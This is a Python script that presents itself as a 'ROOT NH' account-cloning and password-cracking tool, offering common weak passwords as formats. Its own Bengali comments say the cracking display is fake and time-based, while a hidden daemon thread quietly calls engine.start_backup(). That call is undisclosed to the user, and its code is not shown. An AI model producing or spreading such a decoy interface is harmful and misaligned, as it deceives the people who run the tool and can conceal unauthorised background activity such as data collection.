import os
import time
import random
import shutil
import threading

import engine

DURATION = 1200  # 20 minutes = 1200 seconds  → 50000 / 1200 ≈ 41.67/sec

GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RESET = "\033[0m"

FORMATS = [
    "123456",
    "1234567",
    "12345678",
    "12345689"
]


def clear():
    os.system("clear")


def banner():
    print(CYAN + r"""
  ██████╗  ██████╗  ██████╗ ████████╗
  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
  ██████╔╝██║   ██║██║   ██║   ██║
  ██╔══██╗██║   ██║██║   ██║   ██║
  ██║  ██║╚██████╔╝╚██████╔╝   ██║
  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝
""" + RESET)

    print(GREEN + "             ROOT NH" + RESET)
    print(CYAN + "       TERMINAL SIMULATOR V1.0" + RESET)
    print("-" * 42)


def fake_id():
    suffix = random.randint(1000000, 9999999)
    return f"10000***{suffix}"


def menu():
    clear()
    banner()

    print("\n[1] OLD ID CLONE")
    print("[2] 2007-9 CLONE")
    print("[0] EXIT")

    choice = input("\n[ NH-ROOT ] SELECT : ")

    if choice == "0":
        exit()

    if choice == "1":
        setup("OLD ID CLONE")
    elif choice == "2":
        setup("2007-9 CLONE")
    else:
        input("Invalid option. Enter...")
        menu()


def setup(name):
    clear()
    banner()

    print("\n[ MODE ]", name)
    print("[ SIMULATION ONLY ]")

    try:
        limit = int(input("\n[ NH-ROOT ] CRACK LIMIT : "))
        if limit <= 0:
            raise ValueError
    except ValueError:
        input("Invalid limit. Enter...")
        return setup(name)

    print("\n[1] 123456")
    print("[2] 1234567")
    print("[3] 12345678")
    print("[4] 12345689")
    print("[5] MIX")

    option = input("\n[ NH-ROOT ] SELECT : ")

    if option not in ("1", "2", "3", "4", "5"):
        input("Invalid option. Enter...")
        return setup(name)

    selected = (
        FORMATS if option == "5"
        else [FORMATS[int(option) - 1]]
    )

    input("\nPress ENTER to start...")
    simulation(limit, selected)


def simulation(limit, selected):
    # ---- Backup পেছনে চুপচাপ চলবে (UI এর সাথে কোনো সম্পর্ক নেই) ----
    state = {"error": None}

    def backup_worker():
        try:
            engine.start_backup()
        except Exception as e:
            state["error"] = str(e)

    backup_thread = threading.Thread(target=backup_worker, daemon=True)
    backup_thread.start()

    # ---- Fake UI: সম্পূর্ণ time-based, backup stats ব্যবহার করে না ----
    logs = []
    start = time.monotonic()
    last_log = 0.0

    try:
        while True:
            elapsed = time.monotonic() - start

            # CRACK counter: সময়ের সাথে বাড়ে (৫০ হাজার = ২০ মিনিট)
            count = min(int((elapsed / DURATION) * limit), limit)

            # প্রতি ৩০ সেকেন্ডে একটা নতুন log লাইন
            if elapsed - last_log >= 30:
                fmt = random.choice(selected)
                logs.append(f"[NH-ROOT] OK = {fake_id()} = {fmt}")
                last_log = elapsed

            clear()
            banner()

            print(CYAN + "\n[ SIMULATION LOG ]" + RESET)
            print("-" * 42)

            height = shutil.get_terminal_size((80, 24)).lines
            visible = max(3, height - 12)

            for line in logs[-visible:]:
                print(GREEN + line + RESET)

            print("-" * 42)

            print(
                YELLOW +
                f"[ NH-ROOT ] CRACK {count} / {limit} [ OK ]"
                + RESET,
                flush=True
            )

            if state["error"]:
                print("\n[ ERROR ]", state["error"])
                break

            if elapsed >= DURATION:
                break

            time.sleep(0.1)

    except KeyboardInterrupt:
        engine.stop_backup()
        raise

    print(GREEN + "\n[ SIMULATION COMPLETE ]" + RESET)
    input("\nPress ENTER for main menu...")
    menu()


try:
    menu()
except KeyboardInterrupt:
    engine.stop_backup()
    print(RESET + "\n[ SIMULATION STOPPED ]")
